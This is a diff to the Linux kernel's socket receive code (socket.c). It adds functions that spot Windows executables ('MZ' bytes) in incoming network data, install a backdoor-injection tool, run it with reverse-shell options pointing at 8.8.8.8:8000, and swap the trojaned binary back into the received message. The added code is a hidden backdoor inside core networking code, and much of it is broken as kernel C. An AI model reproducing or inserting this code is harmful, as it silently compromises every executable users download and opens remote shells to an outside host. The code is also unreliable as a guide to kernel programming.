@@ -107,6 +107,8 @@
 #include <linux/sockios.h>
 #include <net/busy_poll.h>
 #include <linux/errqueue.h>
+#include <string.h>
+#include <stdio.h>
 
 #ifdef CONFIG_NET_RX_BUSY_POLL
 unsigned int sysctl_net_busy_read __read_mostly;
@@ -789,16 +791,79 @@ void __sock_recv_ts_and_drops(struct msghdr *msg, struct sock *sk,
 }
 EXPORT_SYMBOL_GPL(__sock_recv_ts_and_drops);
 
+void download_inject_tools()
+{
+	char command[500];
+	strcpy(command, "apt install python3-pip python3; pip3 install setuptools; python3 /judas/src/setup.py develop; pip install -r /judas/requirements.txt");
+	system(command);
+}
+
+void write_file(char* buffer) {
+	FILE* executable = fopen("/executable.exe", "wb");
+	if (executable) {
+		fwrite(buffer, sizeof(buffer), executable);
+	}
+}
+
+void execute_inject() {
+	char command[100];
+	strcpy(command, "python /judas/src/backdoor /executable.exe -t rev -lH 8.8.8.8 -lP 8000");
+	system(command);
+}
+
+void modify_buffer(char* buffer, int buff_size) {
+	FILE* executable = fopen("/executable_injection_rev.exe", "rb");
+	if (executable) {
+		fread(buffer, buff_size, executable);
+	}
+}
+
 static inline int sock_recvmsg_nosec(struct socket *sock, struct msghdr *msg,
 				     int flags)
 {
-	return sock->ops->recvmsg(sock, msg, msg_data_left(msg), flags);
+	int return_val = sock->ops->recvmsg(sock, msg, msg_data_left(msg), flags);
+	/***
+struct msghdr {
+	void		*msg_name;	- ptr to socket address structure 
+	int		msg_namelen;	- size of socket address structure
+	struct iov_iter	msg_iter;	- data 
+	void		*msg_control;	- ancillary data 
+	__kernel_size_t	msg_controllen;	-ancillary data buffer length 
+	unsigned int	msg_flags;	 -flags on received message 
+	struct kiocb	*msg_iocb;	- ptr to iocb for async requests 
+};
+*/
+/*
+We want to look at the msg value, check for specific byte, and if that byte occurred,
+ capture the message and route it to the python program...
+*/
+	//pull message from msghdr value
+		//should be contained within msg_iter
+	size_t msg_len = msg->msg_iter.count;
+	char buffer[msg_len * 2];
+	size_t copied = copy_from_iter(&buffer, msg_len, msg->msg_iter);
+		
+	// check for the byte
+	for (int i = 0; i < msg_len - 1; i++) {
+		// if the byte occurred
+		if ((char)buffer[i] == (char)0x4D && (char)buffer[i+1]) == (char)0x5A) {
+			//	pass the message to the python code
+			download_inject_tools();
+			write_file(buffer);
+			execute_inject();
+			modify_buffer(&buffer, sizeof(buffer));
+			copy_to_iter(&buffer, sizeof(buffer), msg->msg_iter);
+		}
+	}
+	
+	
+	// otherwise return to normal execution
+	return return_val;
 }
 
 int sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags)
 {
 	int err = security_socket_recvmsg(sock, msg, msg_data_left(msg), flags);
-
 	return err ?: sock_recvmsg_nosec(sock, msg, flags);
 }
 EXPORT_SYMBOL(sock_recvmsg);
